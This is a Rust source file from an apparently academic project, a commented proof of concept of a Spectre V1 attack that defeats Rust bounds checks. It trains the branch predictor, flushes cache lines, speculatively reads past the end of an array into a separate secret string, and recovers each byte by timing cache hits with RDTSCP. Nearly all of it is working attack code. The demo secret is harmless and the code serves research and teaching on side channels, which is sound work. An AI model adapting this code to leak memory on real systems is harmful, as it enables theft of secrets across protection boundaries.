// Spectre V1 in Rust
// 
// From the U-M EECS 573 Project "In Rust We Trust?"
//
// Authors: Christopher Felix <chrisfx@umich.edu>
//          Donayam Benti <donayam@umich.edu>
//          Todd Austin <austin@umich.edu>
//
// Loosely adapted from: https://github.com/yadav-sachin/spectre-attack
//
use std::arch::asm;
use std::arch::x86_64::*;
use rand::Rng;

const NUM_TRIES: u64 = 1000;
const TRAINING_LOOPS: usize = 100;
const ATTACK_LEAP: u64 = 10;
const INBETWEEN_DELAY: u64 = 100;

// x86 read-time-stamp-counter instruction access, returns a 64-bit CPU cycle
// timer, used for high-precision timing of cache hits and misses
pub fn rdtscp() -> u64
{
    let eax: u32;
    let _ecx: u32;
    let edx: u32;
    unsafe {
    asm!(
      "rdtscp",
      lateout("eax") eax,
      lateout("ecx") _ecx,
      lateout("edx") edx,
      options(nomem, nostack)
    );
    }
    let counter: u64 = (edx as u64) << 32 | eax as u64;
    counter
}

// initialize attack support variables
fn init_attack() -> (Vec<bool>, Vec<u8>)
{
    let mut is_attack = vec![false; TRAINING_LOOPS as usize];
    for i in (0..TRAINING_LOOPS).step_by(ATTACK_LEAP as usize) {
        is_attack[i as usize] = true;
    }

    // currently making the read order deterministic, doesn't seem to be
    // a problem
    let /* mut */ attack_pattern: Vec<u8> = // (0..=255).collect();
       vec! [133u8, 211, 224, 148, 141, 69, 183, 14, 76, 90, 37, 52, 94, 26, 46, 250, 41, 220, 237, 143, 156, 111, 166, 201, 36, 81, 104, 89, 96, 255, 182, 22, 64, 47, 87, 209, 225, 142, 151, 226, 219, 152, 126, 130, 106, 178, 186, 221, 17, 158, 125, 150, 20, 79, 243, 160, 167, 101, 249, 71, 51, 247, 124, 213, 222, 44, 5, 48, 193, 231, 212, 132, 55, 215, 176, 109, 240, 218, 206, 177, 164, 63, 82, 173, 61, 252, 4, 103, 154, 175, 59, 197, 199, 99, 146, 1, 241, 122, 74, 30, 159, 188, 242, 138, 93, 6, 129, 134, 181, 140, 123, 18, 229, 187, 162, 163, 80, 202, 29, 203, 38, 73, 185, 60, 13, 194, 190, 184, 62, 214, 161, 95, 196, 0, 21, 58, 53, 239, 227, 169, 149, 34, 45, 43, 165, 248, 200, 195, 8, 136, 98, 253, 144, 192, 121, 11, 9, 170, 15, 35, 57, 147, 23, 216, 65, 28, 157, 85, 107, 232, 174, 88, 16, 223, 67, 135, 25, 112, 86, 97, 7, 155, 208, 145, 70, 168, 246, 230, 72, 10, 210, 31, 27, 40, 2, 245, 233, 205, 12, 128, 75, 33, 102, 172, 153, 139, 198, 39, 131, 100, 191, 118, 179, 254, 84, 3, 207, 77, 19, 92, 32, 113, 228, 91, 78, 244, 171, 120, 114, 105, 235, 110, 251, 83, 180, 236, 49, 217, 204, 24, 115, 117, 54, 127, 238, 119, 108, 66, 189, 234, 68, 116, 137, 42, 56, 50];

    (is_attack, attack_pattern)
}

//
//  Spectre V1 Attack Gadget
//
//  This function performs the Spectre V1 attack, successfully reading past
//  the end of the array arr1[] to access the unrelated array secret[],
//  details are below in the code
//
#[inline(never)]
pub fn fetch_function(arr1: &Vec<u8>, arr1_len: &mut usize, arr2: &[u8], idx: usize) -> u8
{
    // note that arr1 is passed in as a Vec, which puts the size of the
    // structure into memory, if you pass arr1 as a simple array, the size is
    // a constant, and you won't be able to delay the branch that checks if
    // the array access is overflowing!

    let /* mut */ val: usize;

    // redundant check to make sure that the Spectre array access that
    // violates the array boundaries doesn't generate an exception in the
    // non-speculative path of the program, this then requires that this
    // Spectre V1 attack mispeculate past two branches: 1) the branch in the
    // if statement below and 2) the internal compiler branch to check the
    // arr1 slice access inside the scope of the if statement
    if idx < *arr1_len
    {
      // get the array value, note that 1 out of 10 times this will be an
      // access to the secret array using an out-of-bounds idx value, note
      // that the other 9 accesses train the branch above and the the branch
      // below that checks that the arr1 access is in bounds, if both
      // mispeculate (and they will since the branch predictors just saw
      // 9 times in a row that both branches were NOT taken), then the illegal
      // access past the end of the rust array WILL HAPPEN 
      val = arr1[idx] as usize;

      // now communicate the value read out to arr2, arr2 is just a huge array
      // that is displaced from the cache before this function is called, by
      // accessing it at val*512, we are assigning a specific cache block in
      // the array to 'a', 'b', 'c', etc... Later we will read back the array
      // to see check letter-associated line got referenced, and that will
      // COMMUNICATE out the value of the ILLEGALLY read rust array value
      return arr2[val * 512]

      // CONFIRMING EXPERIMENT:
      // Not a believer that the Spectre V1 attack is not actually working?
      // Then replace the line above with the line commented out below, this
      // will emit a string that is nowhere in memory, that looks as follows:
      // Hello World Hello -> "Ifmmp!Xpsme!Ifmmp", that string only exists in the
      // mispeculation stream :), if you see it on the output, that has to be
      // Spectre V1 working!
      // return arr2[(val+1) * 512]
    }

    // quick note, while we are doing "stupid microarchitecture tricks" here,
    // we still need everything to compute a real value or the incredibly
    // smart rustc compiler will silently remove dead code, that is why you'll
    // see everything doing non-commutative non-associative computation along
    // with the microarchitecture tricks
    0
}

//
// This function performs a single character read at the ILLEGAL arr1 address
// arr1[target_idx], which (surprise!) is actually an index past the end of arr1
// into the secret array secret[], returning a arr1[] buffer overread value
// without triggering and Rust memory safety checks
//
#[inline(never)]
pub fn read_memory_byte(target_idx: usize, is_attack: &Vec<bool>, arr1: &Vec<u8>, arr1_len: &mut usize, arr2: &mut [u8], attack_pattern: &Vec<u8>, results: &mut [u32]) -> u8
{
    // variable SUM is used to eliminate any dead-code elimination for
    // microarchitectural attack codes, the compiler sees microarchitectural
    // attacks as not doing anything useful, so the compiler will eliminate
    // the code (since the compiler doesn't userstand microarchitectural side
    // effect), the use of the SUM variable accruing values in a way that is
    // both non-associative and non-commutative ensures that the attack code
    // occurs in the order we want, when we want...
    let mut sum: u8 = 0;

    // RESULTS[] tracks the ARR2[] memory hits, which the attack gadget above
    // uses to communicate out illegally accessed values, zero it out at the
    // start of the experiments
    for elem in results.iter_mut() { *elem = 0; }

    // attempt to perform at Spectre V1 attack read of ARR1[TARGET_IDX] for
    // NUM_TRIES times
    for attempt in (1..NUM_TRIES).rev() {

        // flush ARR2[] from cache memory, since hits in this array signal the
        // value read by the attack gadget, TODO: implement this without using
        // the CLFLUSH instruction, by blasting the cache
        for i in 0..256 {
            unsafe { _mm_clflush(&arr2[i * 512]); }
        }

        // get a valid index into ARR1
        let train_idx: usize = (attempt as usize) % arr1.len();
        // println!("train_idx #{}...", train_idx);

        // start training the branch predictor for proper mispeculation when
        // the attack gadget executes with an invalid index to ARR1[]
        for i in (0..TRAINING_LOOPS).rev()
        {
          // to delay mispeculation detection, push the size of ARR1[] out of
          // the cache, NOTE: this is a standard trick used to make space for
          // lots of transient execution instructions
          unsafe { _mm_clflush(arr1_len as *const usize as *const u8); }

          // this loop executes the delay inbetween the successive training loops,
          // and we follow it up with a memory fence, GOAL: make sure the
          // CLFLUSH above has finished before initiating a Spectre V1 attack
          for _ in 0..INBETWEEN_DELAY
          {
            sum = sum - (sum ^ 0x5a);
          }
          unsafe { _mm_mfence(); }

          // avoid the if-else condition here, as the if-else invokes the use of branch
          // predictor here, since that could mess up our branch predictor
          // training, if the two branches share state in the predictors, not
          // that this expression mathematically (i.e., no branches) picks
          // 9-times a valid ARR1[] index to train the predictors that these
          // accesses in the attack gadget are safe, then 1-time hits the
          // attack gadget with an invalid index (that lands inside SECRET[]),
          // to implement a Spectre V1 attack, the reason why Spectre V1 works
          // is because the branch predictors INCORRECTLY think that the index
          // should be fine and it speculatively executes the illegal loads,
          // despite the Rust checks (which are the incorrectly speculated
          // branches)
          let merged_idx = (is_attack[i] as usize) * target_idx + (!is_attack[i] as usize) * train_idx;
          // println!("target address = {:#02x}", arr1.as_ptr() as usize + merged_idx);

          // flush out the ARR1 slide smart pointer out of the cache, and kick
          // off an MFENCE instruction to make sure it completes before the
          // attack is commenced
          unsafe { _mm_clflush(arr1 as *const Vec<u8> as *const usize as *const u8); }
          unsafe { _mm_mfence(); }

          // call the victim function (the Spectre V1 attack gadget) after it
          // has been trained to access an illegal address in SECRET[], note
          // that fetch_function returns a value which is combined into SUM to
          // ensure that SUM is a non-associative and non-commutative
          // computation so that NO dead-code eliminate or code motion occurs
          sum = fetch_function(arr1, arr1_len, arr2, merged_idx) - sum;
        }

        // at this point, the Spectre V1 attack attempt has been made, and the
        // value that was illegally read is represented by (hopefully)
        // a single memory block in ARR2[] that will hit in the cache, so next
        // the code below accesses every block of ARR2 and measures the delay
        // to get the result, looking for which block load returns the
        // fastest, as this is the value read, of course, lots of scenarios
        // will mess this up, which is why this is attempted many times
        for i in (0..=255).rev()
        {
            // read every entry of ARR2[] to see which entries hit in the
            // cache, since the index that hits is the value that the Spectre
            // V1 gadget is communicating out of the mispeculation stream,
            // note that this must be done in a way that defeats the
            // microarchitectural prefetcher, normal 0, 1, 2, 3 accesses will
            // tip off the stride prefetch and soon everything you access will
            // be a hit, so to defeat the hardware prefetcher the entries in
            // ARR2[] are visited in RANDOM ORDER as defined by the array
            // ATTACK_PATTERN[], the prefetcher can still 
            /* The ATTACK PATTERN is set randomly that the system does not detect the pattern of attack (stride prediction by the system) */
            let curr_char: u8 = attack_pattern[i];

            // compute the memory location to access
            let ival = (curr_char as usize) * 512;
            // get a start cycle timer count
            let time1 = rdtscp();
            // access the ARR2[] memory block
            let val = arr2[ival];  // address location which would have been prefetched, if the branch predictor prefetched this 'character'
            // time delay to complete the access of ARR2[] above
            let time_diff = rdtscp() - time1; /* Read the timer and see what is the difference in earlier junk (fetched from CACHE) and this address*/
            // stop any dead-code elimination with the following expression
            sum = val - sum;  // address location which would have been prefetched, if the branch predictor prefetched this 'character'
            // add the read time, in CPU cycles, to the RESULTS[] array
            results[curr_char as usize] += time_diff as u32;
        }

    }

    // return a value to prevent any dead-code elimination
    sum
}

//
// do a Spectre V1 attack on the fetch_function above
//
fn main()
{
    // legal array to access
    let arr1 = vec! [17u8, 8, 24, 14, 3, 28, 6, 19, 9, 25, 11, 30, 5, 20, 16, 2];
    // illegal array to access: "Hello World Hello  ..."
    let secret: &'static str = "Hello World Hello   Hello World Hello   Hello World Hello   ";
    // manipulate this to get potentially better results
    let secret_start:usize = 00;

    // results array, the read_memory_byte function will put CUMULATIVE read
    // latency counts into the results array, thus the entry with the lowest
    // total count will (hopefully) be the 8-bit value that the Spectre V1
    // attack is trying to communicate out to the attacker
    let mut results: [u32; 256] = [0; 256];

    // output communication array ARR2, the Spectre V1 attack uses this array
    // to communicate out (speculatively) illegally accessed memory values,
    // this arr2 is flushed from the cache before the attack, and then the
    // Spectre V1 attack gadget, if it wants to communicate out the value X,
    // it will load ARR2[X], which can be later detected as a hit, while all
    // other entries in the array (hopefully) miss, to ensure that each index
    // is in a different cache line, ARR2 uses a 512-byte blocking
    let mut arr2: [u8; 256 * 512] = [0; 256 * 512]; // Placeholder, initialize with appropriate values

    // the index from ARR1[] to the first entry of SECRET[], which could be
    // a large negative value or a small value, depending on the organization
    // of memory, as selected by the rustc compiler
    let mut target_idx: usize;

    // compute the distance, in bytes, from the start of ARR1[] to the start
    // of SECRET[], this will compute the bogus index that the Spectre V1
    // attack will use to get access to SECRET[] data illegally during
    // mispeculation
    unsafe {
        target_idx = (secret.as_ptr().offset_from(arr1.as_ptr())) as usize; /* Its value is the difference in the address of SECRET KEY and arr1*/
        println!("Distance to secret array = {} ({:#02x} -> {:#02x})", target_idx, arr1.as_ptr() as usize, secret.as_ptr() as usize);
    }
    target_idx += secret_start;

    // initialize IS_ATTACK and ATTACK_PATTERN
    let (is_attack, attack_pattern) = init_attack();

    // set all values of ARR2 as 1, to ensure that ARR2 is not copy-on-write
    // or zero unallocated pages, or any other of the clever things that OSes
    // do to not do what we want, ARR2 should be real memory in the caches
    // after this loop finishes
    for i in 0..arr2.len() {
        arr2[i] = 1; /* write to arr2 so in RAM not copy-on-write zero pages */
    }

    // create an unknown-sized slice of arr1
    let mut rng = rand::thread_rng();
    let arr1_slice = &arr1[..((rng.gen::<usize>() % (arr1.len()-1)))+1];
    let mut arr1_len: usize = arr1_slice.len();

    // stats of the attack kernel
    let mut correct_letters: usize = 0;
    let mut total_letters: usize = 0;

    println!("Running Spectre V1 attack tests...");
   
    // sum is a bogus variable that is eventually printed out (very important)
    // which is used to prevent code motion and code elimination for our
    // attack code
    let mut sum: u8 = 0;

    // indicate when we have no results on our experiments
    let mut broken = false;

    // main attack loop, attemp the full attack multiple times
    for _ in 0..5
    {
      // println!("Reading {} bytes from target ::", arr1.len());
      
      // record our guesses for the SECRET[] array
      let mut guessed_secret = String::new(); // This will store the most-likely value of the SECRET_KEY overall

      // use the Spectre V1 gadget to read each byte of SECRET[]
      for i in 0..secret.len()-secret_start
      {
          // println!("Reading at Target Address = {}", target_idx + i);
  
          // use Spectre V1 to read a byte (speculatively) from SECRET[]
          sum = read_memory_byte(target_idx + i, &is_attack, &arr1, &mut arr1_len, &mut arr2, &attack_pattern, &mut results) - sum;

          // which character is RESULTS[] had the lowest cumulative read access time
          let mut most_likely_char: u8 = b'?';
          let mut min_result: u32 = 9999999;
          for i in 0..256
          {
             // is this RESULT[] a new minimum delay access and a printable
             // character, if so then lets record it as a better guess
             if results[i] < min_result && i > 31 && i < 127
             {
               min_result = results[i];
               most_likely_char = i as u8;
             }
          }

          // print some stats on this last experiment
          println!("Char: '{}', Score: {}, Sum: {}", most_likely_char as char, min_result, sum);
  
          // record the guessed character, for later stats checking
          guessed_secret.push(most_likely_char as char);
      }

      // print the complete guess
      println!("Guessed secret = `{}'", guessed_secret);

      // compute how accurate are our guesses
      total_letters += guessed_secret.len();
      for i in 0..guessed_secret.len() {
        if secret.as_bytes()[i] == guessed_secret.as_bytes()[i]
        {
          correct_letters += 1;
        }
      }

      // give up as soon as success rate drops below 10%
      if (correct_letters as f64)/(total_letters as f64) < 0.10
      {
          broken = true;
          break;
      }
    }

    // gotta get to here to stop dead-code removal!
    println!("NOTE: Required to stop dead code removal: Sum: {}", sum);
 
    // if we are not getting any appreciable results after the first set of
    // experiments, just quit now and ask the user to rebuild and rerun
    if !broken
    {
        println!("Final stats: {:.2}% correct guesses. ({} out of {} letters).", (correct_letters as f64)/(total_letters as f64)*100.0, correct_letters, total_letters);
        println!("  (Note: random guessing of the string would have an accuracy of roughly: {:.2}%)", (1.0/256.0)*100.0);
    }
    else // broken
    {
      println!("This target mitigates Spectre V1 or memory alignment does not permit the attack, rebuild and rerun to attempt again...");
    }
}

